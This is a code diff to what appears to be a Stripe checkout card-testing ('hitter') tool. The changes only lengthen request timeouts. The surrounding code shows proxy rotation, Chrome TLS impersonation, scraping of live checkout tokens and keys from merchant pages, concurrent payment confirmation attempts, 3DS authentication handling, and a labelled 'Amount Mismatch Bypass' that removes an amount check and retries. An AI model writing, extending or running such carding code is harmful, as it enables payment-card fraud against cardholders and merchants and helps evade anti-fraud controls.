@@ -78,7 +78,7 @@ class StripeAPIExtractor:
                 proxies = {"http": proxy_url, "https": proxy_url}
                 
             loop = asyncio.get_event_loop()
-            response = await loop.run_in_executor(None, lambda: requests.post(url, headers=headers, data=data, proxies=proxies, timeout=15))
+            response = await loop.run_in_executor(None, lambda: requests.post(url, headers=headers, data=data, proxies=proxies, timeout=30))
             if response.status_code == 200:
                 resp_json = response.json()
                 amount = None
@@ -194,7 +194,7 @@ class ProxyManager:
                 
             try:
                 async with aiohttp.ClientSession() as session:
-                    async with session.get("https://checkout.stripe.com/", proxy=proxy_url, timeout=10) as resp:
+                    async with session.get("https://checkout.stripe.com/", proxy=proxy_url, timeout=30) as resp:
                         if resp.status in [200, 404]:
                             return proxy
             except Exception as e:
@@ -551,14 +551,14 @@ class StripeAPIHitter:
                 confirm_data["expected_amount"] = self.raw_amount
             
             loop = asyncio.get_event_loop()
-            confirm_res = await loop.run_in_executor(None, lambda: cffi_requests.post(confirm_url, headers=headers, data=confirm_data, proxies=proxies, timeout=15, impersonate="chrome116"))
+            confirm_res = await loop.run_in_executor(None, lambda: cffi_requests.post(confirm_url, headers=headers, data=confirm_data, proxies=proxies, timeout=30, impersonate="chrome116"))
             confirm_json = confirm_res.json()
             
             # Dynamic Amount Mismatch Bypass
             # If the scraped amount was slightly off (taxes/shipping) and caused a mismatch, instantly retry without the constraint
             if confirm_res.status_code != 200 and confirm_json.get('error', {}).get('code') == 'checkout_amount_mismatch' and 'expected_amount' in confirm_data:
                 del confirm_data['expected_amount']
-                confirm_res = await loop.run_in_executor(None, lambda: cffi_requests.post(confirm_url, headers=headers, data=confirm_data, proxies=proxies, timeout=15, impersonate="chrome116"))
+                confirm_res = await loop.run_in_executor(None, lambda: cffi_requests.post(confirm_url, headers=headers, data=confirm_data, proxies=proxies, timeout=30, impersonate="chrome116"))
                 confirm_json = confirm_res.json()
             
             result['response_time'] = time.time() - start
@@ -618,7 +618,7 @@ class StripeAPIHitter:
                                     "key": self.pk_live
                                 }
                                 
-                                auth_res = await loop.run_in_executor(None, lambda: cffi_requests.post(auth_url, headers=headers, data=auth_data, proxies=proxies, timeout=10, impersonate="chrome116"))
+                                auth_res = await loop.run_in_executor(None, lambda: cffi_requests.post(auth_url, headers=headers, data=auth_data, proxies=proxies, timeout=30, impersonate="chrome116"))
                                 auth_json = auth_res.json()
                                 
                                 state = auth_json.get('state')
@@ -631,7 +631,7 @@ class StripeAPIHitter:
                                     }
                                     if self.raw_amount is not None:
                                         confirm_data_2["expected_amount"] = self.raw_amount
-                                    confirm_res_2 = await loop.run_in_executor(None, lambda: cffi_requests.post(confirm_url, headers=headers, data=confirm_data_2, proxies=proxies, timeout=15, impersonate="chrome116"))
+                                    confirm_res_2 = await loop.run_in_executor(None, lambda: cffi_requests.post(confirm_url, headers=headers, data=confirm_data_2, proxies=proxies, timeout=30, impersonate="chrome116"))
                                     confirm_json_2 = confirm_res_2.json()
                                     
                                     status_2 = confirm_json_2.get('status')
@@ -723,7 +723,7 @@ class ConcurrentHitter:
                 if self.update_callback: await self.update_callback({"status": "analyzing", "step": "Fast-analyzing Stripe endpoint..."})
                 
                 async with cffi_requests.AsyncSession(impersonate="chrome120", proxies=proxies) as s:
-                    resp = await s.get(self.url, timeout=10)
+                    resp = await s.get(self.url, timeout=30)
                     html = resp.text
                     
                     cs_token = StripeAPIExtractor.extract_cs_live(self.url, html)
